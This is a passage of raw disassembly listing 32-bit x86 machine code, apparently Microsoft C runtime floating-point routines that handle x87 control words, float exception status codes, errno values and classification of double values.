  40b82f:	85 d2                	test   %edx,%edx
  40b831:	74 02                	je     0x40b835
  40b833:	d9 e0                	fchs
  40b835:	8b 45 0c             	mov    0xc(%ebp),%eax
  40b838:	dd 18                	fstpl  (%eax)
  40b83a:	eb 03                	jmp    0x40b83f
  40b83c:	33 ff                	xor    %edi,%edi
  40b83e:	47                   	inc    %edi
  40b83f:	85 ff                	test   %edi,%edi
  40b841:	5f                   	pop    %edi
  40b842:	74 08                	je     0x40b84c
  40b844:	6a 10                	push   $0x10
  40b846:	e8 fd dc ff ff       	call   0x409548
  40b84b:	59                   	pop    %ecx
  40b84c:	83 e6 fd             	and    $0xfffffffd,%esi
  40b84f:	f6 c3 10             	test   $0x10,%bl
  40b852:	74 11                	je     0x40b865
  40b854:	f6 45 10 20          	testb  $0x20,0x10(%ebp)
  40b858:	74 0b                	je     0x40b865
  40b85a:	6a 20                	push   $0x20
  40b85c:	e8 e7 dc ff ff       	call   0x409548
  40b861:	59                   	pop    %ecx
  40b862:	83 e6 ef             	and    $0xffffffef,%esi
  40b865:	33 c0                	xor    %eax,%eax
  40b867:	85 f6                	test   %esi,%esi
  40b869:	5e                   	pop    %esi
  40b86a:	0f 94 c0             	sete   %al
  40b86d:	5b                   	pop    %ebx
  40b86e:	8b e5                	mov    %ebp,%esp
  40b870:	5d                   	pop    %ebp
  40b871:	c3                   	ret
  40b872:	8b ff                	mov    %edi,%edi
  40b874:	55                   	push   %ebp
  40b875:	8b ec                	mov    %esp,%ebp
  40b877:	6a 00                	push   $0x0
  40b879:	ff 75 1c             	push   0x1c(%ebp)
  40b87c:	ff 75 18             	push   0x18(%ebp)
  40b87f:	ff 75 14             	push   0x14(%ebp)
  40b882:	ff 75 10             	push   0x10(%ebp)
  40b885:	ff 75 0c             	push   0xc(%ebp)
  40b888:	ff 75 08             	push   0x8(%ebp)
  40b88b:	e8 05 00 00 00       	call   0x40b895
  40b890:	83 c4 1c             	add    $0x1c,%esp
  40b893:	5d                   	pop    %ebp
  40b894:	c3                   	ret
  40b895:	8b ff                	mov    %edi,%edi
  40b897:	55                   	push   %ebp
  40b898:	8b ec                	mov    %esp,%ebp
  40b89a:	8b 45 08             	mov    0x8(%ebp),%eax
  40b89d:	33 c9                	xor    %ecx,%ecx
  40b89f:	53                   	push   %ebx
  40b8a0:	33 db                	xor    %ebx,%ebx
  40b8a2:	43                   	inc    %ebx
  40b8a3:	89 48 04             	mov    %ecx,0x4(%eax)
  40b8a6:	8b 45 08             	mov    0x8(%ebp),%eax
  40b8a9:	57                   	push   %edi
  40b8aa:	bf 0d 00 00 c0       	mov    $0xc000000d,%edi
  40b8af:	89 48 08             	mov    %ecx,0x8(%eax)
  40b8b2:	8b 45 08             	mov    0x8(%ebp),%eax
  40b8b5:	89 48 0c             	mov    %ecx,0xc(%eax)
  40b8b8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40b8bb:	f6 c1 10             	test   $0x10,%cl
  40b8be:	74 0b                	je     0x40b8cb
  40b8c0:	8b 45 08             	mov    0x8(%ebp),%eax
  40b8c3:	bf 8f 00 00 c0       	mov    $0xc000008f,%edi
  40b8c8:	09 58 04             	or     %ebx,0x4(%eax)
  40b8cb:	f6 c1 02             	test   $0x2,%cl
  40b8ce:	74 0c                	je     0x40b8dc
  40b8d0:	8b 45 08             	mov    0x8(%ebp),%eax
  40b8d3:	bf 93 00 00 c0       	mov    $0xc0000093,%edi
  40b8d8:	83 48 04 02          	orl    $0x2,0x4(%eax)
  40b8dc:	f6 c1 01             	test   $0x1,%cl
  40b8df:	74 0c                	je     0x40b8ed
  40b8e1:	8b 45 08             	mov    0x8(%ebp),%eax
  40b8e4:	bf 91 00 00 c0       	mov    $0xc0000091,%edi
  40b8e9:	83 48 04 04          	orl    $0x4,0x4(%eax)
  40b8ed:	f6 c1 04             	test   $0x4,%cl
  40b8f0:	74 0c                	je     0x40b8fe
  40b8f2:	8b 45 08             	mov    0x8(%ebp),%eax
  40b8f5:	bf 8e 00 00 c0       	mov    $0xc000008e,%edi
  40b8fa:	83 48 04 08          	orl    $0x8,0x4(%eax)
  40b8fe:	f6 c1 08             	test   $0x8,%cl
  40b901:	74 0c                	je     0x40b90f
  40b903:	8b 45 08             	mov    0x8(%ebp),%eax
  40b906:	bf 90 00 00 c0       	mov    $0xc0000090,%edi
  40b90b:	83 48 04 10          	orl    $0x10,0x4(%eax)
  40b90f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b912:	56                   	push   %esi
  40b913:	8b 75 0c             	mov    0xc(%ebp),%esi
  40b916:	8b 06                	mov    (%esi),%eax
  40b918:	c1 e0 04             	shl    $0x4,%eax
  40b91b:	f7 d0                	not    %eax
  40b91d:	33 41 08             	xor    0x8(%ecx),%eax
  40b920:	83 e0 10             	and    $0x10,%eax
  40b923:	31 41 08             	xor    %eax,0x8(%ecx)
  40b926:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b929:	8b 06                	mov    (%esi),%eax
  40b92b:	03 c0                	add    %eax,%eax
  40b92d:	f7 d0                	not    %eax
  40b92f:	33 41 08             	xor    0x8(%ecx),%eax
  40b932:	83 e0 08             	and    $0x8,%eax
  40b935:	31 41 08             	xor    %eax,0x8(%ecx)
  40b938:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b93b:	8b 06                	mov    (%esi),%eax
  40b93d:	d1 e8                	shr    $1,%eax
  40b93f:	f7 d0                	not    %eax
  40b941:	33 41 08             	xor    0x8(%ecx),%eax
  40b944:	83 e0 04             	and    $0x4,%eax
  40b947:	31 41 08             	xor    %eax,0x8(%ecx)
  40b94a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b94d:	8b 06                	mov    (%esi),%eax
  40b94f:	c1 e8 03             	shr    $0x3,%eax
  40b952:	f7 d0                	not    %eax
  40b954:	33 41 08             	xor    0x8(%ecx),%eax
  40b957:	83 e0 02             	and    $0x2,%eax
  40b95a:	31 41 08             	xor    %eax,0x8(%ecx)
  40b95d:	8b 06                	mov    (%esi),%eax
  40b95f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b962:	c1 e8 05             	shr    $0x5,%eax
  40b965:	f7 d0                	not    %eax
  40b967:	33 41 08             	xor    0x8(%ecx),%eax
  40b96a:	23 c3                	and    %ebx,%eax
  40b96c:	31 41 08             	xor    %eax,0x8(%ecx)
  40b96f:	e8 2f dc ff ff       	call   0x4095a3
  40b974:	8b d0                	mov    %eax,%edx
  40b976:	f6 c2 01             	test   $0x1,%dl
  40b979:	74 07                	je     0x40b982
  40b97b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b97e:	83 49 0c 10          	orl    $0x10,0xc(%ecx)
  40b982:	f6 c2 04             	test   $0x4,%dl
  40b985:	74 07                	je     0x40b98e
  40b987:	8b 45 08             	mov    0x8(%ebp),%eax
  40b98a:	83 48 0c 08          	orl    $0x8,0xc(%eax)
  40b98e:	f6 c2 08             	test   $0x8,%dl
  40b991:	74 07                	je     0x40b99a
  40b993:	8b 45 08             	mov    0x8(%ebp),%eax
  40b996:	83 48 0c 04          	orl    $0x4,0xc(%eax)
  40b99a:	f6 c2 10             	test   $0x10,%dl
  40b99d:	74 07                	je     0x40b9a6
  40b99f:	8b 45 08             	mov    0x8(%ebp),%eax
  40b9a2:	83 48 0c 02          	orl    $0x2,0xc(%eax)
  40b9a6:	f6 c2 20             	test   $0x20,%dl
  40b9a9:	74 06                	je     0x40b9b1
  40b9ab:	8b 45 08             	mov    0x8(%ebp),%eax
  40b9ae:	09 58 0c             	or     %ebx,0xc(%eax)
  40b9b1:	8b 06                	mov    (%esi),%eax
  40b9b3:	b9 00 0c 00 00       	mov    $0xc00,%ecx
  40b9b8:	23 c1                	and    %ecx,%eax
  40b9ba:	74 35                	je     0x40b9f1
  40b9bc:	3d 00 04 00 00       	cmp    $0x400,%eax
  40b9c1:	74 22                	je     0x40b9e5
  40b9c3:	3d 00 08 00 00       	cmp    $0x800,%eax
  40b9c8:	74 0c                	je     0x40b9d6
  40b9ca:	3b c1                	cmp    %ecx,%eax
  40b9cc:	75 29                	jne    0x40b9f7
  40b9ce:	8b 45 08             	mov    0x8(%ebp),%eax
  40b9d1:	83 08 03             	orl    $0x3,(%eax)
  40b9d4:	eb 21                	jmp    0x40b9f7
  40b9d6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b9d9:	8b 01                	mov    (%ecx),%eax
  40b9db:	83 e0 fe             	and    $0xfffffffe,%eax
  40b9de:	83 c8 02             	or     $0x2,%eax
  40b9e1:	89 01                	mov    %eax,(%ecx)
  40b9e3:	eb 12                	jmp    0x40b9f7
  40b9e5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40b9e8:	8b 01                	mov    (%ecx),%eax
  40b9ea:	83 e0 fd             	and    $0xfffffffd,%eax
  40b9ed:	0b c3                	or     %ebx,%eax
  40b9ef:	eb f0                	jmp    0x40b9e1
  40b9f1:	8b 45 08             	mov    0x8(%ebp),%eax
  40b9f4:	83 20 fc             	andl   $0xfffffffc,(%eax)
  40b9f7:	8b 06                	mov    (%esi),%eax
  40b9f9:	b9 00 03 00 00       	mov    $0x300,%ecx
  40b9fe:	23 c1                	and    %ecx,%eax
  40ba00:	74 20                	je     0x40ba22
  40ba02:	3d 00 02 00 00       	cmp    $0x200,%eax
  40ba07:	74 0c                	je     0x40ba15
  40ba09:	3b c1                	cmp    %ecx,%eax
  40ba0b:	75 22                	jne    0x40ba2f
  40ba0d:	8b 45 08             	mov    0x8(%ebp),%eax
  40ba10:	83 20 e3             	andl   $0xffffffe3,(%eax)
  40ba13:	eb 1a                	jmp    0x40ba2f
  40ba15:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ba18:	8b 01                	mov    (%ecx),%eax
  40ba1a:	83 e0 e7             	and    $0xffffffe7,%eax
  40ba1d:	83 c8 04             	or     $0x4,%eax
  40ba20:	eb 0b                	jmp    0x40ba2d
  40ba22:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ba25:	8b 01                	mov    (%ecx),%eax
  40ba27:	83 e0 eb             	and    $0xffffffeb,%eax
  40ba2a:	83 c8 08             	or     $0x8,%eax
  40ba2d:	89 01                	mov    %eax,(%ecx)
  40ba2f:	8b 45 08             	mov    0x8(%ebp),%eax
  40ba32:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40ba35:	c1 e1 05             	shl    $0x5,%ecx
  40ba38:	33 08                	xor    (%eax),%ecx
  40ba3a:	81 e1 e0 ff 01 00    	and    $0x1ffe0,%ecx
  40ba40:	31 08                	xor    %ecx,(%eax)
  40ba42:	8b 45 08             	mov    0x8(%ebp),%eax
  40ba45:	09 58 20             	or     %ebx,0x20(%eax)
  40ba48:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
  40ba4c:	74 2c                	je     0x40ba7a
  40ba4e:	8b 45 08             	mov    0x8(%ebp),%eax
  40ba51:	83 60 20 e1          	andl   $0xffffffe1,0x20(%eax)
  40ba55:	8b 45 18             	mov    0x18(%ebp),%eax
  40ba58:	d9 00                	flds   (%eax)
  40ba5a:	8b 45 08             	mov    0x8(%ebp),%eax
  40ba5d:	d9 58 10             	fstps  0x10(%eax)
  40ba60:	8b 45 08             	mov    0x8(%ebp),%eax
  40ba63:	09 58 60             	or     %ebx,0x60(%eax)
  40ba66:	8b 45 08             	mov    0x8(%ebp),%eax
  40ba69:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  40ba6c:	83 60 60 e1          	andl   $0xffffffe1,0x60(%eax)
  40ba70:	8b 45 08             	mov    0x8(%ebp),%eax
  40ba73:	d9 03                	flds   (%ebx)
  40ba75:	d9 58 50             	fstps  0x50(%eax)
  40ba78:	eb 3a                	jmp    0x40bab4
  40ba7a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ba7d:	8b 41 20             	mov    0x20(%ecx),%eax
  40ba80:	83 e0 e3             	and    $0xffffffe3,%eax
  40ba83:	83 c8 02             	or     $0x2,%eax
  40ba86:	89 41 20             	mov    %eax,0x20(%ecx)
  40ba89:	8b 45 18             	mov    0x18(%ebp),%eax
  40ba8c:	dd 00                	fldl   (%eax)
  40ba8e:	8b 45 08             	mov    0x8(%ebp),%eax
  40ba91:	dd 58 10             	fstpl  0x10(%eax)
  40ba94:	8b 45 08             	mov    0x8(%ebp),%eax
  40ba97:	09 58 60             	or     %ebx,0x60(%eax)
  40ba9a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40ba9d:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  40baa0:	8b 41 60             	mov    0x60(%ecx),%eax
  40baa3:	83 e0 e3             	and    $0xffffffe3,%eax
  40baa6:	83 c8 02             	or     $0x2,%eax
  40baa9:	89 41 60             	mov    %eax,0x60(%ecx)
  40baac:	8b 45 08             	mov    0x8(%ebp),%eax
  40baaf:	dd 03                	fldl   (%ebx)
  40bab1:	dd 58 50             	fstpl  0x50(%eax)
  40bab4:	e8 50 da ff ff       	call   0x409509
  40bab9:	8d 45 08             	lea    0x8(%ebp),%eax
  40babc:	50                   	push   %eax
  40babd:	6a 01                	push   $0x1
  40babf:	6a 00                	push   $0x0
  40bac1:	57                   	push   %edi
  40bac2:	ff 15 a8 d0 40 00    	call   *0x40d0a8
  40bac8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40bacb:	f6 41 08 10          	testb  $0x10,0x8(%ecx)
  40bacf:	74 03                	je     0x40bad4
  40bad1:	83 26 fe             	andl   $0xfffffffe,(%esi)
  40bad4:	f6 41 08 08          	testb  $0x8,0x8(%ecx)
  40bad8:	74 03                	je     0x40badd
  40bada:	83 26 fb             	andl   $0xfffffffb,(%esi)
  40badd:	f6 41 08 04          	testb  $0x4,0x8(%ecx)
  40bae1:	74 03                	je     0x40bae6
  40bae3:	83 26 f7             	andl   $0xfffffff7,(%esi)
  40bae6:	f6 41 08 02          	testb  $0x2,0x8(%ecx)
  40baea:	74 03                	je     0x40baef
  40baec:	83 26 ef             	andl   $0xffffffef,(%esi)
  40baef:	f6 41 08 01          	testb  $0x1,0x8(%ecx)
  40baf3:	74 03                	je     0x40baf8
  40baf5:	83 26 df             	andl   $0xffffffdf,(%esi)
  40baf8:	8b 01                	mov    (%ecx),%eax
  40bafa:	ba ff f3 ff ff       	mov    $0xfffff3ff,%edx
  40baff:	83 e0 03             	and    $0x3,%eax
  40bb02:	83 e8 00             	sub    $0x0,%eax
  40bb05:	74 35                	je     0x40bb3c
  40bb07:	83 e8 01             	sub    $0x1,%eax
  40bb0a:	74 22                	je     0x40bb2e
  40bb0c:	83 e8 01             	sub    $0x1,%eax
  40bb0f:	74 0d                	je     0x40bb1e
  40bb11:	83 e8 01             	sub    $0x1,%eax
  40bb14:	75 28                	jne    0x40bb3e
  40bb16:	81 0e 00 0c 00 00    	orl    $0xc00,(%esi)
  40bb1c:	eb 20                	jmp    0x40bb3e
  40bb1e:	8b 06                	mov    (%esi),%eax
  40bb20:	25 ff fb ff ff       	and    $0xfffffbff,%eax
  40bb25:	0d 00 08 00 00       	or     $0x800,%eax
  40bb2a:	89 06                	mov    %eax,(%esi)
  40bb2c:	eb 10                	jmp    0x40bb3e
  40bb2e:	8b 06                	mov    (%esi),%eax
  40bb30:	25 ff f7 ff ff       	and    $0xfffff7ff,%eax
  40bb35:	0d 00 04 00 00       	or     $0x400,%eax
  40bb3a:	eb ee                	jmp    0x40bb2a
  40bb3c:	21 16                	and    %edx,(%esi)
  40bb3e:	8b 01                	mov    (%ecx),%eax
  40bb40:	c1 e8 02             	shr    $0x2,%eax
  40bb43:	83 e0 07             	and    $0x7,%eax
  40bb46:	83 e8 00             	sub    $0x0,%eax
  40bb49:	74 19                	je     0x40bb64
  40bb4b:	83 e8 01             	sub    $0x1,%eax
  40bb4e:	74 09                	je     0x40bb59
  40bb50:	83 e8 01             	sub    $0x1,%eax
  40bb53:	75 1a                	jne    0x40bb6f
  40bb55:	21 16                	and    %edx,(%esi)
  40bb57:	eb 16                	jmp    0x40bb6f
  40bb59:	8b 06                	mov    (%esi),%eax
  40bb5b:	23 c2                	and    %edx,%eax
  40bb5d:	0d 00 02 00 00       	or     $0x200,%eax
  40bb62:	eb 09                	jmp    0x40bb6d
  40bb64:	8b 06                	mov    (%esi),%eax
  40bb66:	23 c2                	and    %edx,%eax
  40bb68:	0d 00 03 00 00       	or     $0x300,%eax
  40bb6d:	89 06                	mov    %eax,(%esi)
  40bb6f:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
  40bb73:	5e                   	pop    %esi
  40bb74:	74 07                	je     0x40bb7d
  40bb76:	d9 41 50             	flds   0x50(%ecx)
  40bb79:	d9 1b                	fstps  (%ebx)
  40bb7b:	eb 05                	jmp    0x40bb82
  40bb7d:	dd 41 50             	fldl   0x50(%ecx)
  40bb80:	dd 1b                	fstpl  (%ebx)
  40bb82:	5f                   	pop    %edi
  40bb83:	5b                   	pop    %ebx
  40bb84:	5d                   	pop    %ebp
  40bb85:	c3                   	ret
  40bb86:	8b ff                	mov    %edi,%edi
  40bb88:	55                   	push   %ebp
  40bb89:	8b ec                	mov    %esp,%ebp
  40bb8b:	8b 45 08             	mov    0x8(%ebp),%eax
  40bb8e:	83 f8 01             	cmp    $0x1,%eax
  40bb91:	74 15                	je     0x40bba8
  40bb93:	83 c0 fe             	add    $0xfffffffe,%eax
  40bb96:	83 f8 01             	cmp    $0x1,%eax
  40bb99:	77 18                	ja     0x40bbb3
  40bb9b:	e8 59 a0 ff ff       	call   0x405bf9
  40bba0:	c7 00 22 00 00 00    	movl   $0x22,(%eax)
  40bba6:	5d                   	pop    %ebp
  40bba7:	c3                   	ret
  40bba8:	e8 4c a0 ff ff       	call   0x405bf9
  40bbad:	c7 00 21 00 00 00    	movl   $0x21,(%eax)
  40bbb3:	5d                   	pop    %ebp
  40bbb4:	c3                   	ret
  40bbb5:	8b ff                	mov    %edi,%edi
  40bbb7:	55                   	push   %ebp
  40bbb8:	8b ec                	mov    %esp,%ebp
  40bbba:	8b 55 0c             	mov    0xc(%ebp),%edx
  40bbbd:	83 ec 20             	sub    $0x20,%esp
  40bbc0:	33 c9                	xor    %ecx,%ecx
  40bbc2:	8b c1                	mov    %ecx,%eax
  40bbc4:	39 14 c5 28 1c 41 00 	cmp    %edx,0x411c28(,%eax,8)
  40bbcb:	74 08                	je     0x40bbd5
  40bbcd:	40                   	inc    %eax
  40bbce:	83 f8 1d             	cmp    $0x1d,%eax
  40bbd1:	7c f1                	jl     0x40bbc4
  40bbd3:	eb 07                	jmp    0x40bbdc
  40bbd5:	8b 0c c5 2c 1c 41 00 	mov    0x411c2c(,%eax,8),%ecx
  40bbdc:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40bbdf:	85 c9                	test   %ecx,%ecx
  40bbe1:	74 55                	je     0x40bc38
  40bbe3:	8b 45 10             	mov    0x10(%ebp),%eax
  40bbe6:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40bbe9:	8b 45 14             	mov    0x14(%ebp),%eax
  40bbec:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40bbef:	8b 45 18             	mov    0x18(%ebp),%eax
  40bbf2:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40bbf5:	8b 45 1c             	mov    0x1c(%ebp),%eax
  40bbf8:	56                   	push   %esi
  40bbf9:	8b 75 08             	mov    0x8(%ebp),%esi
  40bbfc:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40bbff:	8b 45 20             	mov    0x20(%ebp),%eax
  40bc02:	68 ff ff 00 00       	push   $0xffff
  40bc07:	ff 75 28             	push   0x28(%ebp)
  40bc0a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40bc0d:	8b 45 24             	mov    0x24(%ebp),%eax
  40bc10:	89 75 e0             	mov    %esi,-0x20(%ebp)
  40bc13:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40bc16:	e8 01 d9 ff ff       	call   0x40951c
  40bc1b:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40bc1e:	50                   	push   %eax
  40bc1f:	e8 d1 86 ff ff       	call   0x4042f5
  40bc24:	83 c4 0c             	add    $0xc,%esp
  40bc27:	85 c0                	test   %eax,%eax
  40bc29:	75 07                	jne    0x40bc32
  40bc2b:	56                   	push   %esi
  40bc2c:	e8 55 ff ff ff       	call   0x40bb86
  40bc31:	59                   	pop    %ecx
  40bc32:	dd 45 f8             	fldl   -0x8(%ebp)
  40bc35:	5e                   	pop    %esi
  40bc36:	eb 1b                	jmp    0x40bc53
  40bc38:	68 ff ff 00 00       	push   $0xffff
  40bc3d:	ff 75 28             	push   0x28(%ebp)
  40bc40:	e8 d7 d8 ff ff       	call   0x40951c
  40bc45:	ff 75 08             	push   0x8(%ebp)
  40bc48:	e8 39 ff ff ff       	call   0x40bb86
  40bc4d:	dd 45 20             	fldl   0x20(%ebp)
  40bc50:	83 c4 0c             	add    $0xc,%esp
  40bc53:	8b e5                	mov    %ebp,%esp
  40bc55:	5d                   	pop    %ebp
  40bc56:	c3                   	ret
  40bc57:	8b ff                	mov    %edi,%edi
  40bc59:	55                   	push   %ebp
  40bc5a:	8b ec                	mov    %esp,%ebp
  40bc5c:	dd 45 08             	fldl   0x8(%ebp)
  40bc5f:	d9 ee                	fldz
  40bc61:	dd e1                	fucom  %st(1)
  40bc63:	df e0                	fnstsw %ax
  40bc65:	57                   	push   %edi
  40bc66:	f6 c4 44             	test   $0x44,%ah
  40bc69:	7a 09                	jp     0x40bc74
  40bc6b:	dd d9                	fstp   %st(1)
  40bc6d:	33 ff                	xor    %edi,%edi
  40bc6f:	e9 af 00 00 00       	jmp    0x40bd23
  40bc74:	56                   	push   %esi
  40bc75:	66 8b 75 0e          	mov    0xe(%ebp),%si
  40bc79:	0f b7 c6             	movzwl %si,%eax
  40bc7c:	a9 f0 7f 00 00       	test   $0x7ff0,%eax
  40bc81:	75 7c                	jne    0x40bcff
  40bc83:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40bc86:	8b 55 08             	mov    0x8(%ebp),%edx
  40bc89:	f7 c1 ff ff 0f 00    	test   $0xfffff,%ecx
  40bc8f:	75 04                	jne    0x40bc95
  40bc91:	85 d2                	test   %edx,%edx
  40bc93:	74 6a                	je     0x40bcff
  40bc95:	de d9                	fcompp
  40bc97:	bf 03 fc ff ff       	mov    $0xfffffc03,%edi
  40bc9c:	df e0                	fnstsw %ax
  40bc9e:	f6 c4 41             	test   $0x41,%ah
  40bca1:	75 05                	jne    0x40bca8
  40bca3:	33 c0                	xor    %eax,%eax
  40bca5:	40                   	inc    %eax
  40bca6:	eb 02                	jmp    0x40bcaa
  40bca8:	33 c0                	xor    %eax,%eax
  40bcaa:	f6 45 0e 10          	testb  $0x10,0xe(%ebp)
  40bcae:	75 1f                	jne    0x40bccf
  40bcb0:	03 c9                	add    %ecx,%ecx
  40bcb2:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40bcb5:	85 d2                	test   %edx,%edx
  40bcb7:	79 06                	jns    0x40bcbf
  40bcb9:	83 c9 01             	or     $0x1,%ecx
  40bcbc:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40bcbf:	03 d2                	add    %edx,%edx
  40bcc1:	4f                   	dec    %edi
  40bcc2:	f6 45 0e 10          	testb  $0x10,0xe(%ebp)
  40bcc6:	74 e8                	je     0x40bcb0
  40bcc8:	66 8b 75 0e          	mov    0xe(%ebp),%si
  40bccc:	89 55 08             	mov    %edx,0x8(%ebp)
  40bccf:	b9 ef ff 00 00       	mov    $0xffef,%ecx
  40bcd4:	66 23 f1             	and    %cx,%si
  40bcd7:	66 89 75 0e          	mov    %si,0xe(%ebp)
  40bcdb:	85 c0                	test   %eax,%eax
  40bcdd:	74 0c                	je     0x40bceb
  40bcdf:	b8 00 80 00 00       	mov    $0x8000,%eax
  40bce4:	66 0b f0             	or     %ax,%si
  40bce7:	66 89 75 0e          	mov    %si,0xe(%ebp)
  40bceb:	dd 45 08             	fldl   0x8(%ebp)
  40bcee:	6a 00                	push   $0x0
  40bcf0:	51                   	push   %ecx
  40bcf1:	51                   	push   %ecx
  40bcf2:	dd 1c 24             	fstpl  (%esp)
  40bcf5:	e8 31 00 00 00       	call   0x40bd2b
  40bcfa:	83 c4 0c             	add    $0xc,%esp
  40bcfd:	eb 23                	jmp    0x40bd22
  40bcff:	6a 00                	push   $0x0
  40bd01:	51                   	push   %ecx
  40bd02:	dd d8                	fstp   %st(0)
  40bd04:	51                   	push   %ecx
  40bd05:	dd 1c 24             	fstpl  (%esp)
  40bd08:	e8 1e 00 00 00       	call   0x40bd2b
  40bd0d:	0f b7 fe             	movzwl %si,%edi
  40bd10:	83 c4 0c             	add    $0xc,%esp
  40bd13:	c1 ef 04             	shr    $0x4,%edi
  40bd16:	81 e7 ff 07 00 00    	and    $0x7ff,%edi
  40bd1c:	81 ef fe 03 00 00    	sub    $0x3fe,%edi
  40bd22:	5e                   	pop    %esi
  40bd23:	8b 45 10             	mov    0x10(%ebp),%eax
  40bd26:	89 38                	mov    %edi,(%eax)
  40bd28:	5f                   	pop    %edi
  40bd29:	5d                   	pop    %ebp
  40bd2a:	c3                   	ret
  40bd2b:	8b ff                	mov    %edi,%edi
  40bd2d:	55                   	push   %ebp
  40bd2e:	8b ec                	mov    %esp,%ebp
  40bd30:	51                   	push   %ecx
  40bd31:	51                   	push   %ecx
  40bd32:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40bd35:	0f b7 45 0e          	movzwl 0xe(%ebp),%eax
  40bd39:	dd 45 08             	fldl   0x8(%ebp)
  40bd3c:	25 0f 80 00 00       	and    $0x800f,%eax
  40bd41:	dd 5d f8             	fstpl  -0x8(%ebp)
  40bd44:	8d 89 fe 03 00 00    	lea    0x3fe(%ecx),%ecx
  40bd4a:	c1 e1 04             	shl    $0x4,%ecx
  40bd4d:	0b c8                	or     %eax,%ecx
  40bd4f:	66 89 4d fe          	mov    %cx,-0x2(%ebp)
  40bd53:	dd 45 f8             	fldl   -0x8(%ebp)
  40bd56:	8b e5                	mov    %ebp,%esp
  40bd58:	5d                   	pop    %ebp
  40bd59:	c3                   	ret
  40bd5a:	8b ff                	mov    %edi,%edi
  40bd5c:	55                   	push   %ebp
  40bd5d:	8b ec                	mov    %esp,%ebp
  40bd5f:	81 7d 0c 00 00 f0 7f 	cmpl   $0x7ff00000,0xc(%ebp)
  40bd66:	8b 45 08             	mov    0x8(%ebp),%eax
  40bd69:	75 07                	jne    0x40bd72
  40bd6b:	85 c0                	test   %eax,%eax
  40bd6d:	75 15                	jne    0x40bd84
  40bd6f:	40                   	inc    %eax
  40bd70:	5d                   	pop    %ebp
  40bd71:	c3                   	ret
  40bd72:	81 7d 0c 00 00 f0 ff 	cmpl   $0xfff00000,0xc(%ebp)
  40bd79:	75 09                	jne    0x40bd84
  40bd7b:	85 c0                	test   %eax,%eax
  40bd7d:	75 05                	jne    0x40bd84
  40bd7f:	6a 02                	push   $0x2
  40bd81:	58                   	pop    %eax
  40bd82:	5d                   	pop    %ebp
  40bd83:	c3                   	ret
  40bd84:	66 8b 4d 0e          	mov    0xe(%ebp),%cx
  40bd88:	ba f8 7f 00 00       	mov    $0x7ff8,%edx
  40bd8d:	66 23 ca             	and    %dx,%cx
  40bd90:	66 3b ca             	cmp    %dx,%cx
  40bd93:	75 04                	jne    0x40bd99
  40bd95:	6a 03                	push   $0x3
  40bd97:	eb e8                	jmp    0x40bd81
  40bd99:	ba f0 7f 00 00       	mov    $0x7ff0,%edx
  40bd9e:	66 3b ca             	cmp    %dx,%cx
  40bda1:	75 11                	jne    0x40bdb4
  40bda3:	f7 45 0c ff ff 07 00 	testl  $0x7ffff,0xc(%ebp)
  40bdaa:	75 04                	jne    0x40bdb0
  40bdac:	85 c0                	test   %eax,%eax
  40bdae:	74 04                	je     0x40bdb4
  40bdb0:	6a 04                	push   $0x4
  40bdb2:	eb cd                	jmp    0x40bd81
  40bdb4:	33 c0                	xor    %eax,%eax
  40bdb6:	5d                   	pop    %ebp
  40bdb7:	c3                   	ret
  40bdb8:	8b ff                	mov    %edi,%edi
  40bdba:	55                   	push   %ebp
  40bdbb:	8b ec                	mov    %esp,%ebp
  40bdbd:	66 8b 4d 0e          	mov    0xe(%ebp),%cx
  40bdc1:	ba f0 7f 00 00       	mov    $0x7ff0,%edx
  40bdc6:	66 8b c1             	mov    %cx,%ax
  40bdc9:	66 23 c2             	and    %dx,%ax
  40bdcc:	66 3b c2             	cmp    %dx,%ax
  40bdcf:	75 33                	jne    0x40be04
  40bdd1:	dd 45 08             	fldl   0x8(%ebp)
  40bdd4:	51                   	push   %ecx
  40bdd5:	51                   	push   %ecx
  40bdd6:	dd 1c 24             	fstpl  (%esp)
  40bdd9:	e8 7c ff ff ff       	call   0x40bd5a
  40bdde:	59                   	pop    %ecx
  40bddf:	59                   	pop    %ecx
  40bde0:	83 e8 01             	sub    $0x1,%eax
  40bde3:	74 18                	je     0x40bdfd
  40bde5:	83 e8 01             	sub    $0x1,%eax
  40bde8:	74 0e                	je     0x40bdf8
  40bdea:	83 e8 01             	sub    $0x1,%eax
  40bded:	74 05                	je     0x40bdf4
  40bdef:	33 c0                	xor    %eax,%eax
  40bdf1:	40                   	inc    %eax
  40bdf2:	5d                   	pop    %ebp
  40bdf3:	c3                   	ret
  40bdf4:	6a 02                	push   $0x2
  40bdf6:	eb 02                	jmp    0x40bdfa
  40bdf8:	6a 04                	push   $0x4
  40bdfa:	58                   	pop    %eax
  40bdfb:	5d                   	pop    %ebp
  40bdfc:	c3                   	ret
  40bdfd:	b8 00 02 00 00       	mov    $0x200,%eax
  40be02:	5d                   	pop    %ebp
  40be03:	c3                   	ret
  40be04:	0f b7 c9             	movzwl %cx,%ecx
